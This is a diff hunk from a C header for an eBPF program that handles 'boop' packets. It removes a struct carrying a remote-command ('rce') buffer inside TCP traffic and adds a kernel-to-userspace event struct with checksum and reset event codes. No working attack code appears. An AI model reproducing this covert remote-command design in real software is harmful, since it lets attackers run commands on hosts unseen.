@@ -26,14 +26,30 @@
 // MAX_RCE_SIZE is the maximum size of a boop command to execute.
 #define MAX_RCE_SIZE 128
 
-struct encapsulated_tcp_boop {
-  // saddr is the 4 byte minimum required to pass an
-  // IP address over TCP
-  __u8 saddrval[4];  // Saturn Valley
 
-  // rce is an optional buffer to fill with a command if
-  // a boop can encapsulate one.
-  char rce[MAX_RCE_SIZE];
+#define EVENT_SRC_BAD_CSUM       1
+#define EVENT_SRC_RECEIVE_RESET  2
+
+
+// event_boop_t represents an event from the kernel.
+//
+// We will pass as much data up to userspace as possible.
+// The convention is to not mutate the data in the eBPF probe
+// but rather translate the data to userspace as quickly as possible.
+//
+// The userspace component will be responsible for making sense
+// of whatever data is transferred in an event.
+//
+// NOTE: All event_boop_t fields MUST be used in a probe in order
+// to pass the eBPF verifier!
+struct event_boop_t {
+
+  // saddr is 32 fucking bytes
+  __u8 saddr[32];
+
+  // an enumerated type of EVENT_SRC_* from above
+  int event_src_code;
+
 };
 
 // VERSION is the semantic version of the program
